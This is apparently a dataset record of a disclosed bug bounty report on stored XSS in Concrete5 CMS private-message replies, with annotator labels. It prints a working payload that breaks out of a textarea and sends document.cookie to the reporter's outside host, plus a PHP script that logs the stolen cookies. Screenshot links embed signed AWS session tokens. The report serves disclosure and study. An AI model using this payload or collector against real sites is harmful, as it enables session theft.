{
    "reported_to": "Concrete CMS",
    "reported_by": "bl4de ",
    "title": "Stored XSS in Private Messages 'Reply' allows to execute malicious JavaScript against any user while replying to the message which contains payload",
    "content": "\nIntro\n\"Back to the Crayons\"\nType of issue: Core CMS issue\nLevel of severity: External Attack Vector\nConcrete5 version: 8.2.0 RC2 rev. 32c9daf352645d4fafedb7b956e7f2de4e153ab3 (July 8th)\nSummary\nThere is Stored XSS vulnerability in Private Messages 'Reply' feature, when original message is quoted in reply content (this is by default). This issue can be used against any user, who accepted receiving private messages and replies to the message contains malicious payload.\nTo exploit this vulnerability an attacker has to trick other user to reply to his message.\nSteps to reproduce\nlog in to concrete5 instance as any user\ngo to index.php/account/messages. Change url to index.php/account/messages/write/1 which is equivalent to sending PM to admin (changing user id in url to any other value allows to send message to selected user)\nset message title, then as a content of message put (at the end): closing </textarea> tag followed by any valid JavaScript code inside <script> tag.\n<image_0>\nI used following payload in my attack:\nCode 170 Bytes\n1</textarea>\n2<script>\n3    var i = document.createElement('img')\n4    i.src = 'https://bl4de.000webhostapp.com/?c=' + document.cookie;\n5    document.body.append(i);\n6</script>\nIt creates and appends img element with url which points to my server on 000web hosting and allows to send cookie(s) to my PHP script:\nCode 88 Bytes\n1Hello :)\n2<?php\n3if (isset($_GET['c'])) {\n4\tfile_put_contents(\"cookies.txt\", $_GET['c']);\n5}\nsend message\nTo verify that vulnerability exists, log in as admin (or any user you've sent message to) and go to Private Messages Inbox:\n<image_1>\nopen message\nThe content is properly sanitized (no JavaScript executed):\n<image_2>\nNow the fun part begins.\nSelect Reply from the dropdown with message menu. As you can see, content of the original message is embeded below ------- Original Message ------- separator, however - is not sanitized, causes JavaScript script is executed in context of logged admin (my sample attack scenario tries to steal cookie to hijack admin session and failed due to Http Only flag set, but it does not change the fact that Stored XSS attack works):\n<image_3>\nWhen we inspect HTML source, we can verify that closing </textarea> tag from payload allows to \"escape\" from message textarea and append and run JavaScript:\nCode 667 Bytes\n1<div class=\"form-group\">\n2\t\t\t\t<label for=\"body\" class=\"control-label\">Message</label>\t\t\t\t<textarea id=\"msgBody\" name=\"msgBody\" rows=\"8\" class=\"span5 form-control\">\n3\n4\n5-------------------- Original Message --------------------\n6From: kotek\n7Date Sent: Jul 9, 2017, 9:55 PM\n8Subject: Problem with page!!!\n9\n10Hi, could you please take a look at this and reply? Thanks!\n11\n12</textarea>\n13<script>\n14        var i = document.createElement('img')\n15        i.src = 'https://bl4de.000webhostapp.com/?c=' + document.cookie;\n16        document.body.append(i);\n17    </script></textarea>\t\t\t</div>\n18\n19\t\t\t<div class=\"ccm-dashboard-form-actions-wrapper\">\n20\t\t\t    <div class=\"ccm-dashboard-form-actions\">\nIn presented PoC, one cookie was sent and saved on my 000web application:\n<image_4>\nImpact\nAny user is able to send PM to other user(s) with malicious payload trying to trick them to reply to his message. This scenario is described as External Attack Vector in Concrete5 program policy.\nTesting environment\nSystem:\nConcrete5 version 8.2.0 RC2, commit 32c9daf352645d4fafedb7b956e7f2de4e153ab3 from July 8th, installed localy\nPHP ver. 5.6.30\nApache HTTP Server 2.4.25 for macOS\nMySQL ver. 5.7.13 for macOS\nThis vulnerability was tested on macOS Sierra 10.12.5 with following browsers:\nChrome 59.0.3071.115\nChromium build 61.0.3131.0\nOpera 46.0.2597.32\nWrap up\nI hope my report will help keep Concrete5 safe in the future.\nBest Regards,\nRafal 'bl4de' Janicki\n\n",
    "severity": [
        7.0,
        8.9
    ],
    "bounty": null,
    "weaknesses": [
        "Cross-site Scripting (XSS) - Stored"
    ],
    "screenshots": {
        "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/201/511/e4a5eed18fe444b9b202ae6b132a28e0e467b0be/pm_stroedxss_1.png?response-content-disposition=attachment%3B%20filename%3D%22pm_stroedxss_1.png%22%3B%20filename%2A%3DUTF-8%27%27pm_stroedxss_1.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTYZ3LV4J%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T201329Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEMr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGpXChDQFzHS618muDfIgrMWVDDHPvBqpPf%2Fc%2FOu4O%2B5AiEA0Lc5OOIvN5JEeVMbvCo8i9zBG4aMZl7ku3Glf1x1TWUqsgUIMxADGgwwMTM2MTkyNzQ4NDkiDBKgVgHqHwECRyOygSqPBbXWTDCabAYWMidOhwYhqZDpA8CPPt2rj2m2jBvhq5OooOPGstdbAQD1ybInW3a7ZcFtXPgu6hpoZkOPILAmDaq8xNdQkaf5Ipi31hre%2BVx%2FyZ3NyLUwN3EMb9iWu%2Fh1NAKu3Ise%2BBRa%2FnrSrq8jmCsgrZe5OY%2Fl4cD53z2BohapYs1SdJmfnjBYHeIUExEGDMsAlEDMjX9b1tv%2Bm1EzKRIv2EjFz9hras5XhDSCByzfK2p18h74EaSu4N%2FL%2FDi%2FKTKKISyp8vl6sXvN3BK107RwEQWIGo4F6ybyjbzmVu5eCEt33Pwo1cO%2FtWyh2ErF%2FoG2iCy0P6O5VQRs5GAJzMHTAkQAPkVI9yJ1dMHcFIMU3WAgCEVq%2BjSb02xMt0wDvxzc1DxROQF6XsnPJxG7pA5FvR4CJIw%2FIqeSUX7qkhXGOCRh91%2Bi7AGzldS3PgzhXD2tyADO64coo1npUzkWHSbGN2s7FHaKBg9buC0Gdcw%2FYqHWXb%2FezH%2BumFAT7wOn0L9HZWpWuFnVewTVxqD%2FwajnWsHA4Nf3ViL4EPEz2z8oF%2Fq9JVO1NWsDnNMaFbhcHuvFA%2FFBg5K%2BFktudUCO349RjYpFiX04SGK2ByrHeYYnuCdViGHCO4eZvWwxZ7ZXp1H674TF5F0IGdHRH65knr2wUjynfT8QbyMRjrNYysWVa4fTzUtNvxxQIc4%2BgH5SapxPuJFnV9O8ZqMcTL5kH5mTI5pWUdjO%2Fcq3hRgtZd3Y1prFQvHQsLDWMeREvGBi8G05%2FXVyQ1%2Fk1y4uk%2F%2FjwHvep9zO5XhO96sv8onQdWWSVaWmGVwW8EH8UlJ9dNmmaP5bou19UxxmmQRzlEaX1kMiS6HH5Wn0Boj2f9rW5uYw7fiQvwY6sQE0IJ2uUF2Lc7t23ItG27YWAX0j%2FTWycvzlo4P02T%2FudRKMFmsP0EvlBIROh%2Bwy53Q%2FCS3XbEWlb1deanSq0wPxiK50Ik5pM024835IE8%2Fx%2B%2B%2BOdjKEvwZ4tgFMAyOogzI8c1egFJjGfvMAsyAArhvnRwOr8XiNIfUDiebY9tZmr7OorRAOxj4vMUoAvWxe%2FIAt0JYhCpx%2FFoWWTLgVisZErrEK53K%2FNI4KKkfMFrAUny8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=dc9d4803da776ca7535d0fd60e44eabe33b67daecf01a4f4be935ac5d9e78448",
        "image_1": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/201/512/0fe841c0e39b607f6f779c59948d36a51ec0f868/pm_stroedxss_2.png?response-content-disposition=attachment%3B%20filename%3D%22pm_stroedxss_2.png%22%3B%20filename%2A%3DUTF-8%27%27pm_stroedxss_2.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTYZ3LV4J%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T201329Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEMr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGpXChDQFzHS618muDfIgrMWVDDHPvBqpPf%2Fc%2FOu4O%2B5AiEA0Lc5OOIvN5JEeVMbvCo8i9zBG4aMZl7ku3Glf1x1TWUqsgUIMxADGgwwMTM2MTkyNzQ4NDkiDBKgVgHqHwECRyOygSqPBbXWTDCabAYWMidOhwYhqZDpA8CPPt2rj2m2jBvhq5OooOPGstdbAQD1ybInW3a7ZcFtXPgu6hpoZkOPILAmDaq8xNdQkaf5Ipi31hre%2BVx%2FyZ3NyLUwN3EMb9iWu%2Fh1NAKu3Ise%2BBRa%2FnrSrq8jmCsgrZe5OY%2Fl4cD53z2BohapYs1SdJmfnjBYHeIUExEGDMsAlEDMjX9b1tv%2Bm1EzKRIv2EjFz9hras5XhDSCByzfK2p18h74EaSu4N%2FL%2FDi%2FKTKKISyp8vl6sXvN3BK107RwEQWIGo4F6ybyjbzmVu5eCEt33Pwo1cO%2FtWyh2ErF%2FoG2iCy0P6O5VQRs5GAJzMHTAkQAPkVI9yJ1dMHcFIMU3WAgCEVq%2BjSb02xMt0wDvxzc1DxROQF6XsnPJxG7pA5FvR4CJIw%2FIqeSUX7qkhXGOCRh91%2Bi7AGzldS3PgzhXD2tyADO64coo1npUzkWHSbGN2s7FHaKBg9buC0Gdcw%2FYqHWXb%2FezH%2BumFAT7wOn0L9HZWpWuFnVewTVxqD%2FwajnWsHA4Nf3ViL4EPEz2z8oF%2Fq9JVO1NWsDnNMaFbhcHuvFA%2FFBg5K%2BFktudUCO349RjYpFiX04SGK2ByrHeYYnuCdViGHCO4eZvWwxZ7ZXp1H674TF5F0IGdHRH65knr2wUjynfT8QbyMRjrNYysWVa4fTzUtNvxxQIc4%2BgH5SapxPuJFnV9O8ZqMcTL5kH5mTI5pWUdjO%2Fcq3hRgtZd3Y1prFQvHQsLDWMeREvGBi8G05%2FXVyQ1%2Fk1y4uk%2F%2FjwHvep9zO5XhO96sv8onQdWWSVaWmGVwW8EH8UlJ9dNmmaP5bou19UxxmmQRzlEaX1kMiS6HH5Wn0Boj2f9rW5uYw7fiQvwY6sQE0IJ2uUF2Lc7t23ItG27YWAX0j%2FTWycvzlo4P02T%2FudRKMFmsP0EvlBIROh%2Bwy53Q%2FCS3XbEWlb1deanSq0wPxiK50Ik5pM024835IE8%2Fx%2B%2B%2BOdjKEvwZ4tgFMAyOogzI8c1egFJjGfvMAsyAArhvnRwOr8XiNIfUDiebY9tZmr7OorRAOxj4vMUoAvWxe%2FIAt0JYhCpx%2FFoWWTLgVisZErrEK53K%2FNI4KKkfMFrAUny8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b84c276ac133735fc0907df0a7db6355c2d6baa9eed4dff0a2b8cb7f9017739f",
        "image_2": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/201/514/6c7fb53cc99bacadc05353dd8f831c63095a80f0/pm_stroedxss_3.png?response-content-disposition=attachment%3B%20filename%3D%22pm_stroedxss_3.png%22%3B%20filename%2A%3DUTF-8%27%27pm_stroedxss_3.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTYZ3LV4J%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T201329Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEMr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGpXChDQFzHS618muDfIgrMWVDDHPvBqpPf%2Fc%2FOu4O%2B5AiEA0Lc5OOIvN5JEeVMbvCo8i9zBG4aMZl7ku3Glf1x1TWUqsgUIMxADGgwwMTM2MTkyNzQ4NDkiDBKgVgHqHwECRyOygSqPBbXWTDCabAYWMidOhwYhqZDpA8CPPt2rj2m2jBvhq5OooOPGstdbAQD1ybInW3a7ZcFtXPgu6hpoZkOPILAmDaq8xNdQkaf5Ipi31hre%2BVx%2FyZ3NyLUwN3EMb9iWu%2Fh1NAKu3Ise%2BBRa%2FnrSrq8jmCsgrZe5OY%2Fl4cD53z2BohapYs1SdJmfnjBYHeIUExEGDMsAlEDMjX9b1tv%2Bm1EzKRIv2EjFz9hras5XhDSCByzfK2p18h74EaSu4N%2FL%2FDi%2FKTKKISyp8vl6sXvN3BK107RwEQWIGo4F6ybyjbzmVu5eCEt33Pwo1cO%2FtWyh2ErF%2FoG2iCy0P6O5VQRs5GAJzMHTAkQAPkVI9yJ1dMHcFIMU3WAgCEVq%2BjSb02xMt0wDvxzc1DxROQF6XsnPJxG7pA5FvR4CJIw%2FIqeSUX7qkhXGOCRh91%2Bi7AGzldS3PgzhXD2tyADO64coo1npUzkWHSbGN2s7FHaKBg9buC0Gdcw%2FYqHWXb%2FezH%2BumFAT7wOn0L9HZWpWuFnVewTVxqD%2FwajnWsHA4Nf3ViL4EPEz2z8oF%2Fq9JVO1NWsDnNMaFbhcHuvFA%2FFBg5K%2BFktudUCO349RjYpFiX04SGK2ByrHeYYnuCdViGHCO4eZvWwxZ7ZXp1H674TF5F0IGdHRH65knr2wUjynfT8QbyMRjrNYysWVa4fTzUtNvxxQIc4%2BgH5SapxPuJFnV9O8ZqMcTL5kH5mTI5pWUdjO%2Fcq3hRgtZd3Y1prFQvHQsLDWMeREvGBi8G05%2FXVyQ1%2Fk1y4uk%2F%2FjwHvep9zO5XhO96sv8onQdWWSVaWmGVwW8EH8UlJ9dNmmaP5bou19UxxmmQRzlEaX1kMiS6HH5Wn0Boj2f9rW5uYw7fiQvwY6sQE0IJ2uUF2Lc7t23ItG27YWAX0j%2FTWycvzlo4P02T%2FudRKMFmsP0EvlBIROh%2Bwy53Q%2FCS3XbEWlb1deanSq0wPxiK50Ik5pM024835IE8%2Fx%2B%2B%2BOdjKEvwZ4tgFMAyOogzI8c1egFJjGfvMAsyAArhvnRwOr8XiNIfUDiebY9tZmr7OorRAOxj4vMUoAvWxe%2FIAt0JYhCpx%2FFoWWTLgVisZErrEK53K%2FNI4KKkfMFrAUny8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=8f76243f91641ee0ff83c70b26b783ef0c7e8b2a95e7868e02dfdd3a415ad729",
        "image_3": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/201/513/fb2d95eeb30b341d92a8a8d9749c966dae068fd2/pm_stroedxss_4.png?response-content-disposition=attachment%3B%20filename%3D%22pm_stroedxss_4.png%22%3B%20filename%2A%3DUTF-8%27%27pm_stroedxss_4.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTYZ3LV4J%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T201329Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEMr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGpXChDQFzHS618muDfIgrMWVDDHPvBqpPf%2Fc%2FOu4O%2B5AiEA0Lc5OOIvN5JEeVMbvCo8i9zBG4aMZl7ku3Glf1x1TWUqsgUIMxADGgwwMTM2MTkyNzQ4NDkiDBKgVgHqHwECRyOygSqPBbXWTDCabAYWMidOhwYhqZDpA8CPPt2rj2m2jBvhq5OooOPGstdbAQD1ybInW3a7ZcFtXPgu6hpoZkOPILAmDaq8xNdQkaf5Ipi31hre%2BVx%2FyZ3NyLUwN3EMb9iWu%2Fh1NAKu3Ise%2BBRa%2FnrSrq8jmCsgrZe5OY%2Fl4cD53z2BohapYs1SdJmfnjBYHeIUExEGDMsAlEDMjX9b1tv%2Bm1EzKRIv2EjFz9hras5XhDSCByzfK2p18h74EaSu4N%2FL%2FDi%2FKTKKISyp8vl6sXvN3BK107RwEQWIGo4F6ybyjbzmVu5eCEt33Pwo1cO%2FtWyh2ErF%2FoG2iCy0P6O5VQRs5GAJzMHTAkQAPkVI9yJ1dMHcFIMU3WAgCEVq%2BjSb02xMt0wDvxzc1DxROQF6XsnPJxG7pA5FvR4CJIw%2FIqeSUX7qkhXGOCRh91%2Bi7AGzldS3PgzhXD2tyADO64coo1npUzkWHSbGN2s7FHaKBg9buC0Gdcw%2FYqHWXb%2FezH%2BumFAT7wOn0L9HZWpWuFnVewTVxqD%2FwajnWsHA4Nf3ViL4EPEz2z8oF%2Fq9JVO1NWsDnNMaFbhcHuvFA%2FFBg5K%2BFktudUCO349RjYpFiX04SGK2ByrHeYYnuCdViGHCO4eZvWwxZ7ZXp1H674TF5F0IGdHRH65knr2wUjynfT8QbyMRjrNYysWVa4fTzUtNvxxQIc4%2BgH5SapxPuJFnV9O8ZqMcTL5kH5mTI5pWUdjO%2Fcq3hRgtZd3Y1prFQvHQsLDWMeREvGBi8G05%2FXVyQ1%2Fk1y4uk%2F%2FjwHvep9zO5XhO96sv8onQdWWSVaWmGVwW8EH8UlJ9dNmmaP5bou19UxxmmQRzlEaX1kMiS6HH5Wn0Boj2f9rW5uYw7fiQvwY6sQE0IJ2uUF2Lc7t23ItG27YWAX0j%2FTWycvzlo4P02T%2FudRKMFmsP0EvlBIROh%2Bwy53Q%2FCS3XbEWlb1deanSq0wPxiK50Ik5pM024835IE8%2Fx%2B%2B%2BOdjKEvwZ4tgFMAyOogzI8c1egFJjGfvMAsyAArhvnRwOr8XiNIfUDiebY9tZmr7OorRAOxj4vMUoAvWxe%2FIAt0JYhCpx%2FFoWWTLgVisZErrEK53K%2FNI4KKkfMFrAUny8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=591fb8f2205cabdde5a424900d2f5970b03facde941b5c87b48038b8ab8d7ad4",
        "image_4": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/201/515/d503c42b3378cef8248b95266d07321625383eb5/pm_stroedxss_5.png?response-content-disposition=attachment%3B%20filename%3D%22pm_stroedxss_5.png%22%3B%20filename%2A%3DUTF-8%27%27pm_stroedxss_5.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTYZ3LV4J%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T201329Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEMr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGpXChDQFzHS618muDfIgrMWVDDHPvBqpPf%2Fc%2FOu4O%2B5AiEA0Lc5OOIvN5JEeVMbvCo8i9zBG4aMZl7ku3Glf1x1TWUqsgUIMxADGgwwMTM2MTkyNzQ4NDkiDBKgVgHqHwECRyOygSqPBbXWTDCabAYWMidOhwYhqZDpA8CPPt2rj2m2jBvhq5OooOPGstdbAQD1ybInW3a7ZcFtXPgu6hpoZkOPILAmDaq8xNdQkaf5Ipi31hre%2BVx%2FyZ3NyLUwN3EMb9iWu%2Fh1NAKu3Ise%2BBRa%2FnrSrq8jmCsgrZe5OY%2Fl4cD53z2BohapYs1SdJmfnjBYHeIUExEGDMsAlEDMjX9b1tv%2Bm1EzKRIv2EjFz9hras5XhDSCByzfK2p18h74EaSu4N%2FL%2FDi%2FKTKKISyp8vl6sXvN3BK107RwEQWIGo4F6ybyjbzmVu5eCEt33Pwo1cO%2FtWyh2ErF%2FoG2iCy0P6O5VQRs5GAJzMHTAkQAPkVI9yJ1dMHcFIMU3WAgCEVq%2BjSb02xMt0wDvxzc1DxROQF6XsnPJxG7pA5FvR4CJIw%2FIqeSUX7qkhXGOCRh91%2Bi7AGzldS3PgzhXD2tyADO64coo1npUzkWHSbGN2s7FHaKBg9buC0Gdcw%2FYqHWXb%2FezH%2BumFAT7wOn0L9HZWpWuFnVewTVxqD%2FwajnWsHA4Nf3ViL4EPEz2z8oF%2Fq9JVO1NWsDnNMaFbhcHuvFA%2FFBg5K%2BFktudUCO349RjYpFiX04SGK2ByrHeYYnuCdViGHCO4eZvWwxZ7ZXp1H674TF5F0IGdHRH65knr2wUjynfT8QbyMRjrNYysWVa4fTzUtNvxxQIc4%2BgH5SapxPuJFnV9O8ZqMcTL5kH5mTI5pWUdjO%2Fcq3hRgtZd3Y1prFQvHQsLDWMeREvGBi8G05%2FXVyQ1%2Fk1y4uk%2F%2FjwHvep9zO5XhO96sv8onQdWWSVaWmGVwW8EH8UlJ9dNmmaP5bou19UxxmmQRzlEaX1kMiS6HH5Wn0Boj2f9rW5uYw7fiQvwY6sQE0IJ2uUF2Lc7t23ItG27YWAX0j%2FTWycvzlo4P02T%2FudRKMFmsP0EvlBIROh%2Bwy53Q%2FCS3XbEWlb1deanSq0wPxiK50Ik5pM024835IE8%2Fx%2B%2B%2BOdjKEvwZ4tgFMAyOogzI8c1egFJjGfvMAsyAArhvnRwOr8XiNIfUDiebY9tZmr7OorRAOxj4vMUoAvWxe%2FIAt0JYhCpx%2FFoWWTLgVisZErrEK53K%2FNI4KKkfMFrAUny8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0ca255bcec07bb592b5d5fbd9f5580e2166ea81ee36c4afe82466ebfd5f47dce"
    },
    "disclosed_date": 1503022320,
    "report_url": "https://hackerone.com/reports/247517",
    "is_multi_component": true,
    "complexity": "MEDIUM",
    "novelty": "MEDIUM",
    "vuln_category": "WEB_APP",
    "steps": [
        [
            1,
            "Log in to the Concrete5 CMS as any user"
        ],
        [
            2,
            "Navigate to the private messages section and send a message containing a malicious XSS payload (closing </textarea> tag followed by JavaScript in a <script> tag)"
        ],
        [
            3,
            "Have another user (e.g., admin) receive and reply to this message, triggering the XSS payload execution"
        ]
    ],
    "vuln_description": "Stored XSS vulnerability in the Private Messages 'Reply' feature where malicious JavaScript in the original message is executed when the recipient replies, due to improper sanitization of quoted content.",
    "reason": "The vulnerability involves understanding the interaction between message quoting and textarea context, but the attack vector is straightforward once the XSS payload structure is known. The main complexity lies in recognizing the opportunity to escape the textarea context with a closing tag.",
    "new_complexity": "MEDIUM",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null,
    "injection_metadata": {
        "is_simple_payload": true
    },
    "authnz_metadata": {
        "reason": "The vulnerability involves a stored XSS attack through the private messages 'Reply' feature, which is a client-side attack vector. The proposed methodologies focus on server-side authorization and authentication issues (IDOR and AuthN/AuthZ bypass) by testing different user sessions and resource IDs. Since XSS is a different class of vulnerability that doesn't involve authorization or authentication bypass at the server level, it wouldn't be detected by the described methodologies.",
        "is_detectable": false
    }
}